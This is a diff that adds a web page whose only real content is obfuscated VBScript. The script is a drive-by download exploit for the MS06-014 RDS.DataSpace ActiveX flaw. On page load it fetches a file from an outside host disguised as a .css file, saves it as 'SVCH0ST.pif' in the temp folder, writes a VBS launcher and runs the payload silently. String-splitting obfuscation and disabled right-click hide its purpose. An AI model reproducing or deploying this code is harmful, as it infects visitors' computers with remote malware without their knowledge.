@@ -1,0 +1,83 @@
+/*
+*/
+<html>
+<body>
+</body>
+
+
+<script language=VBScript>
+On Error Resume Next
+gaosigaddressssssssss = "http://user1.16-m6.net/ms06014.css"                    
+gaosigobj="o"
+gaosigobjs="b"
+gaosigobjss="j"
+gaosigobjsss="e"
+gaosigobjssss="c"
+gaosigobjsssss="t"
+Set gaosig_2_cn = document.createElement(gaosigobj&gaosigobjs&gaosigobjss&gaosigobjsss&gaosigobjssss&gaosigobjsssss)
+gaosigun="clsid:"
+gaosigunx="BD"
+gaosigun2="96"
+gaosigun3="C5"
+gaosigun4="56-6"
+gaosigun5="5A"
+gaosigun6="3-1"
+gaosigun7="1D"
+gaosigun8="0-98"
+gaosigun9="3A-0"
+gaosigun10="0C0"
+gaosigun11="4FC"
+gaosigun12="29E"
+gaosigun13="36"
+gaosig3="Microsoft.X"
+gaosig4="MLHTTp"
+gaosig5="G"
+gaosig6="E"
+gaosig7="T"
+gaosigxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+gaosig_2_cn.SetAttribute "classid", gaosigun&gaosigunx&gaosigun2&gaosigun3&gaosigun4&gaosigun5&gaosigun6&gaosigun7&gaosigun8&gaosigun9&gaosigun10&gaosigun11&gaosigun12&gaosigun13
+Set gaosig_love=gaosig_2_cn.CreateObject(gaosigxml,"")
+gaosig_love.Open gaosig5&gaosig6&gaosig7, gaosigaddressssssssss, False
+gaosig_love.Send
+gaosigbuffe="SVCH0ST.pif"
+gaosig_kfqq_sssssssss="SVCH0ST.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = gaosig_2_cn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+gaosiguser="chilam"
+gaosigbuffe=chilam.BuildPath(yingying,gaosigbuffe)
+gaosig_kfqq_sssssssss=chilam.BuildPath(yingying,gaosig_kfqq_sssssssss)
+Set chilams = gaosig_2_cn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write gaosig_love.Responsebody
+chilams.Savetofile gaosigbuffe,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"Set i_love_gaosig = CreateObject(""Wscript"&".Shell"")"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"i_love_gaosig.run ("""&gaosigbuffe&""")"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"
+chilams.Savetofile gaosig_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set gaosigsened = gaosig_2_cn.createobject(www&cute&qq&cn&kfqq, "")
+gaosigdk="O"
+gaosigdks="p"
+gaosigdkss="e"
+gaosigdksss="n"
+gaosigsened.ShellExeCute gaosig_kfqq_sssssssss, "", "", gaosigdk&gaosigdks&gaosigdkss&gaosigdksss, 0
+
+</script>
+
+
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>    
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
